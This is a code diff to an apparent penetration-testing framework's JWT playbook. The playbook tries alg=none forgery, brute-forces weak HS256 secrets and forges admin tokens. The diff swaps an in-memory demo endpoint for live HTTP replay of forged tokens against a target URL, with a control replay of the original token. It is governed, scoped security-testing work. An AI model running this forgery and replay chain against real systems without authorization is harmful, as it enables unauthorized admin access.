@@ -1,17 +1,14 @@
 """First end-to-end playbook: the JWT -> admin kill chain, built on py_trees.
 
 A behavior-tree Selector (fallback) tries attacks in order and stops at the first that works:
-``alg=none`` first, then ``brute weak HS256 secret -> forge admin token``. Each leaf runs real,
-offline crypto (HMAC-SHA256), drives the ``JwtForgePrimitive`` through the Governor, replays the
-forged token at a target, and — only on genuine access — hands evidence to the deterministic
-Validator, which mints the ``Finding``.
+``alg=none`` first, then ``brute weak HS256 secret -> forge admin token``. The crack + forge is
+real offline crypto (HMAC-SHA256) driven through the Governor; the forged token is then REPLAYED
+against the live target via the ACTIVE ``HttpReplayPrimitive``, and only genuine access (a 200
+with data the original token can't reach) is handed to the deterministic Validator, which mints
+the ``Finding``.
 
-This module imports ``py_trees`` (optional dep, install ``pentora[engine]``), so it is NOT
-re-exported from ``pentora.engine.__init__`` — the core stays importable without it.
-
-The ``DemoProtectedResource`` is an in-memory stand-in for the real ``/admin`` endpoint so the
-whole chain runs offline in a test. In production it is replaced by a live replay primitive; the
-playbook logic is identical.
+Imports ``py_trees`` (optional dep, install ``pentora[engine]``), so it is NOT re-exported from
+``pentora.engine.__init__`` — the core stays importable without it.
 """
 from __future__ import annotations
 
@@ -38,6 +35,7 @@ from pentora.engine.primitive import (
     RunContext,
     RunScope,
 )
+from pentora.engine.replay import HttpReplayPrimitive, ReplayInput
 from pentora.engine.validator import DeterministicValidator
 
 # ---- offline HS256 crypto (real) -------------------------------------------
@@ -87,27 +85,7 @@ def forge_alg_none(token: str, claims: dict[str, object]) -> str:
     return f"{header_b64}.{new_payload_b64}."
 
 
-@dataclass
-class DemoProtectedResource:
-    """In-memory stand-in for the real /admin endpoint. Validates HS256 with ``secret`` and
-    returns admin content only when the token's ``role`` claim is admin."""
-
-    secret: str
-
-    def request(self, token: str) -> tuple[int, str]:
-        try:
-            h, p, sig = token.split(".")
-        except ValueError:
-            return 401, "malformed"
-        if not hmac.compare_digest(_sign_hs256(f"{h}.{p}".encode(), self.secret), sig):
-            return 401, "bad signature"
-        claims = json.loads(_b64url_decode(p))
-        if claims.get("role") == "admin":
-            return 200, "ADMIN_PANEL: user list + secrets"
-        return 403, "forbidden"
-
-
-# ---- the primitive (driven through the Governor) ---------------------------
+# ---- the offline forge primitive (driven through the Governor) --------------
 
 class JwtInput(BaseModel):
     jwt: str
@@ -139,7 +117,7 @@ class JwtForgePrimitive(Primitive):
         )
 
 
-# ---- the behavior tree -----------------------------------------------------
+# ---- the behavior tree (replays against a real target) ---------------------
 
 @dataclass
 class JwtPlaybookContext:
@@ -149,12 +127,48 @@ class JwtPlaybookContext:
     hypothesis: Hypothesis
     jwt: str
     wordlist: list[str]
-    resource: DemoProtectedResource
+    target_url: str                         # the live endpoint to replay tokens against
+    scope: RunScope | None = None           # defaults to a permissive read-only scope
 
     def record_negative(self, what: str) -> None:
         self.bb.assert_fact(
             TestedNegative(source="jwt_playbook", what=what, derived_from=[self.hypothesis.id])
         )
+
+
+def _replay(pctx: JwtPlaybookContext, token: str, role: str) -> tuple[int, str]:
+    """Fire a real request with ``token`` via the Governor; return (status, body)."""
+    scope = pctx.scope or RunScope(read_only=True)
+    res = asyncio.run(
+        pctx.governor.execute(
+            HttpReplayPrimitive(),
+            ReplayInput(url=pctx.target_url, token=token, role_label=role),
+            RunContext(scope=scope, budget_requests=50),
+        )
+    )
+    for f in res.facts:
+        pctx.bb.assert_fact(f)
+    return int(res.data.get("status", 0)), str(res.data.get("body", ""))
+
+
+def _confirm_and_promote(
+    pctx: JwtPlaybookContext, forged_status: int, forged_body: str, evidence_ids: list[str]
+) -> bool:
+    """Replay the original token as a control; only a real 200 differential promotes a Finding."""
+    if forged_status != 200 or not forged_body.strip():
+        return False
+    orig_status, orig_body = _replay(pctx, pctx.jwt, "original")
+    if forged_body == orig_body:                # no differential -> not proven
+        return False
+    fact = pctx.validator.promote(pctx.hypothesis, {
+        "forged_token_authorized": forged_status == 200,
+        "original_token_authorized": orig_status == 200,
+        "authorized_marker_present": forged_body != orig_body,
+        "evidence_ids": evidence_ids,
+    })
+    if fact is not None:
+        pctx.bb.assert_fact(fact)
+    return fact is not None
 
 
 class _AlgNoneLeaf(Behaviour):
@@ -164,8 +178,8 @@ class _AlgNoneLeaf(Behaviour):
 
     def update(self) -> Status:
         forged = forge_alg_none(self.pctx.jwt, {"role": "admin"})
-        status, body = self.pctx.resource.request(forged)
-        if status == 200 and "ADMIN" in body:
+        status, body = _replay(self.pctx, forged, "forged_algnone")
+        if _confirm_and_promote(self.pctx, status, body, evidence_ids=[]):
             return Status.SUCCESS
         self.pctx.record_negative("jwt alg=none rejected")
         return Status.FAILURE
@@ -191,18 +205,8 @@ class _BruteForgeLeaf(Behaviour):
         if not token:
             p.record_negative("jwt weak-secret brute failed")
             return Status.FAILURE
-        status, body = p.resource.request(token)
-        orig_status, _ = p.resource.request(p.jwt)   # differential control: the original token
-        if status == 200 and "ADMIN" in body:
-            evidence = {
-                "forged_token_authorized": True,
-                "original_token_authorized": orig_status == 200,
-                "authorized_marker_present": "ADMIN" in body,
-                "evidence_ids": [f.id for f in res.facts],
-            }
-            fact = p.validator.promote(p.hypothesis, evidence)
-            if fact is not None:
-                p.bb.assert_fact(fact)
+        status, body = _replay(p, token, "forged_brute")
+        if _confirm_and_promote(p, status, body, evidence_ids=[f.id for f in res.facts]):
             return Status.SUCCESS
         p.record_negative("forged token not accepted")
         return Status.FAILURE
